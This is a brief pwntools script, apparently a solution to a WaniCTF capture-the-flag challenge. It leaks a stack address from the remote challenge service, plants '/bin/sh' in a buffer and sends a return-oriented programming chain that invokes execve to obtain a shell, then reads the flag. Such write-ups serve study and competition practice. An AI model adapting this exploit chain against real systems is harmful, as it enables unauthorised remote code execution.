from pwn import *


# p = process('./chall')
p = remote('ret2win-pwn.wanictf.org', 9005)

p.recvuntil(b'+0x48 | 0x')
bin_sh_addr = int(p.recv(16), 16) - 0x110
print(hex(bin_sh_addr))

payload = b'a' * 32 + b'/bin/sh\00'
p.send(payload)
pop_rax = 0x401371
xor_rsi = 0x40137e
xor_rdx = 0x40138d
syscall_ret = 0x4013af
payload = p64(0x401394) + p64(pop_rax) + p64(59) + p64(xor_rsi) + p64(xor_rdx) + p64(syscall_ret) + b'f' * 8
p.send(payload)

p.sendline(b'cat FLAG')

p.interactive()
